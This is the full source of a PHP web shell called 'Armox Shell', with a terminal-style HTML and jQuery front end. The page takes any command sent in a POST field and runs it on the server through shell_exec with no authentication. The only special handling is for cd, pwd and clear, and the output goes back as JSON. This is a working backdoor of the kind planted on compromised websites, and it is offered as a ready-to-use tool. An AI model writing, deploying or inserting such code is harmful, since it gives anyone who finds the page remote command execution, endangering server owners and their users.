<?php
    function getPromptName() {
        $username = get_current_user();
        $hostname = gethostname();
        $currentPath = getcwd();
        return $username . "@" . $hostname . ":" . $currentPath . "> ";
    }

    function startShell() {
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd()
        );
        return $response;
    }

    function cdCommand($directory) {
        try {
            chdir($directory);
            $response = null;
        } catch(Exception $e) {
            $response = "No such file or directory / Invalid permission";
        }
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => $response
        );
        return $response;
    }

    function pwdCommand() {
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => getcwd()
        );

        return $response;
    }

    function clearCommand() {
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => "clear"
        );

        return $response;
    }

    function shellCommand($command) {
        $response = trim(shell_exec($command));
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => $response 
        );

        return $response;
    }

    # Catch warning
    set_error_handler(function($errno, $errstr, $errfile, $errline, $errcontext) {
        if (0 === error_reporting()) {
            return false;
        }
    
        throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
    });

    if(isset($_POST['command']) && isset($_POST['currentPath'])) {
        if(trim($_POST['command']) != "") {
            $command = htmlentities($_POST['command']);
            $currentPath = htmlentities($_POST['currentPath']);
            
            chdir($currentPath);

            # cd COMMAND
            if (preg_match("#^cd *#", $command)) {
                $directory = preg_replace('#^cd *#', '$1', $command);
                $response = cdCommand($directory);
            
            # pwd COMMAND 
            } else if($command == "pwd") {
                $response = pwdCommand();
            
            # clear/cls COMMAND
            } else if($command == "clear" || $command == "cls") {
                $response = clearCommand();
            
            # SHELL COMMAND
            } else {
                $response = shellCommand($command);
            }

            header('content-type:application/json');
            echo json_encode($response);
            exit();
        
        # EMPTY COMMAND
        } else{
            $response = array(
                "promptName" => getPromptName(),
                "currentPath" => getcwd(),
                "responseCommand" => null 
            );

            
        }
        
        header('content-type:application/json');
        echo json_encode($response);
        exit();

    # START SHELL
    } else if(isset($_GET['start']) && $_GET['start'] == "true") {
        $response = startShell();

        header('content-type:application/json');
        echo json_encode($response);
        exit();
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Armox Shell</title>
    <style>
        body {
            color:white;
            margin:0px;
            padding:0px;
            background-color:black;
            font-family:Monospace;
        }
        .app-content {
            width:100%;
            max-width:800px;
            margin: auto;
            margin-top:60px;
            margin-bottom:20px;
        }
        .header {
            color:lime;
            text-align:center;
            margin-bottom:30px;
        }
        .title-shell {
            color:lime;
            text-align:center;
            text-transform:uppercase;
        }
        .shell, footer {
            margin-left:15px;
            margin-right:15px;
        }
        .shell {
            height:480px;
            background-color:black;
            font-family:Monospace;
            border:1px solid lime;
            overflow:auto;
        }
        .shell-content {
            color:white;
            padding:5px;
            
        }
        .shell-command_prompt {
            display:flex;
            flex-direction:row;
            justify-content:flex-start;
        }
        .shell-prompt {
            font-weight:bold;
            color:lime;
            margin-right:5px;
        }
        .shell-input {
            font-family:Monospace;
            background:transparent;
            color:white;
            border:none;
            flex:1;
        }
        .response-command {
            font-family:Monospace;
            display:block;
            margin-top:20px;
            margin-bottom:20px;
        }
        .error {
            color:red;
        }
        footer {
            font-family:Monospace;
            border-top:1px solid white;
            margin-top:30px;
            padding-top:15px;
            text-align:center;
        }
        @media only screen and (max-width: 470px) {
            .header {
                font-size:12px;
            }
        }
        @media only screen and (max-width: 430px) {
            .header {
                font-size:10px;
            }
            .shell-prompt, .shell-input, .response-command {
                font-size:12px;
            }
        }
        @media only screen and (max-width: 360px) {
            .header {
                font-size:8px;
            }
        }
    </style>
</head>
<body>
    <div class="app-content">
        
        <pre class="header">
  ___                             _____ _          _ _ 
 / _ \                           /  ___| |        | | |
/ /_\ \_ __ _ __ ___   _____  __ \ `--.| |__   ___| | |
|  _  | '__| '_ ` _ \ / _ \ \/ /  `--. \ '_ \ / _ \ | |
| | | | |  | | | | | | (_) >  <  /\__/ / | | |  __/ | |
\_| |_/_|  |_| |_| |_|\___/_/\_\ \____/|_| |_|\___|_|_|</pre>

        <div id="shell" class="shell">
            <div id="shellContent" class="shell-content">
                <div id="shellCommandPrompt", class="shell-command_prompt">
                    <label id="shellPrompt" for="shellCommand" class="shell-prompt">Try to connect ...</label>
                    <input id="shellCommand" class="shell-input">
                </div>
            </div>
        </div>
        <footer>
            This tools was developped by Morc.
        </footer>
    </div>
    <script
        src="https://code.jquery.com/jquery-3.5.1.min.js"
        integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
        crossorigin="anonymous">
    </script>
    <script>
        function loadShell() {
            document.getElementById("shellCommand").value = "";
            $.ajax({
                url: "",
                method: "GET",
                data: {
                    start : "true",
                },
                cache: false,
                beforeSend: function() {
                    let shellPromptElt = document.getElementById("shellPrompt");
                    shellPromptElt.textContent = "Try to connect ...";
                },
                success: function(response) {  
                    let shellPromptElt = document.getElementById("shellPrompt");
                    shellPromptElt.textContent = response.promptName;

                    let shellCommandElt = document.getElementById("shellCommand");
                    shellCommandElt.focus();
                    getCommand(response.currentPath);
                },
                error: function() {
                    let shellPromptElt = document.getElementById("shellPrompt");
                    shellPromptElt.classList.add("error");
                    shellPromptElt.textContent = "Error, please retry later ...";

                    let shellCommandElt = document.getElementById("shellCommand");
                    shellCommandElt.remove();
                }  
            });
        }   

        function getCommand(currentPath) {
            document.getElementById("shellCommand").addEventListener("keypress", function(e) {
                if (e.key === 'Enter') {
                    $.ajax({
                        url: "",
                        method: "POST",
                        cache: false,
                        data: {
                            currentPath : currentPath,
                            command : document.getElementById("shellCommand").value,
                        },
                        beforeSend: function() {
                            document.getElementById("shellCommand").blur();
                        },
                        success: function(response) {
                            disableExCommandPrompt();
                            if(response.responseCommand == "clear") {
                                clearShell();
                            } else {
                                writeResponseCommand(response.responseCommand)
                            }

                            newCommandPrompt(response.promptName);
                            getCommand(response.currentPath);
                        },
                        error: function() {
                            let shellPromptElt = document.getElementById("shellPrompt");
                            shellPromptElt.classList.add("error");
                            shellPromptElt.textContent = "Error, please retry later ...";

                            let shellCommandElt = document.getElementById("shellCommand");
                            shellCommandElt.remove();
                        }  
                    });
                }
            });
        }

        function clearShell() {
            let shellContentElt = document.getElementById("shellContent");
            shellContentElt.innerHTML = "";
        }

        function writeResponseCommand(response) {
            let responseElt = document.createElement("pre");
            responseElt.className = "response-command";
            responseElt.textContent = response;

            let shellContentElt = document.getElementById("shellContent");
            shellContentElt.appendChild(responseElt);
        }

        function disableExCommandPrompt() {
            let shellPromptElt = document.getElementById("shellPrompt");
            let shellCommandElt = document.getElementById("shellCommand");

            shellPromptElt.id="";
            shellCommandElt.id="";
            shellCommandElt.setAttribute("disabled", true);
        }

        function newCommandPrompt(promptName) {
            let shellCommandPrompt = document.createElement("div");
            shellCommandPrompt.id = "shellCommandPrompt";
            shellCommandPrompt.className = "shell-command_prompt";

            let shellPromptElt = document.createElement("label");
            shellPromptElt.id = "shellPrompt";
            shellPromptElt.className = "shell-prompt";
            shellPromptElt.setAttribute("for", "shellCommand");
            shellPromptElt.textContent = promptName;

            let shellCommandElt = document.createElement("input");
            shellCommandElt.id = "shellCommand";
            shellCommandElt.className = "shell-input";

            shellCommandPrompt.appendChild(shellPromptElt);
            shellCommandPrompt.appendChild(shellCommandElt);

            let shellContentElt = document.getElementById("shellContent");
            shellContentElt.appendChild(shellCommandPrompt)
            
            shellCommandElt.focus();
        }
        
        loadShell();
    </script>
</body>
</html>
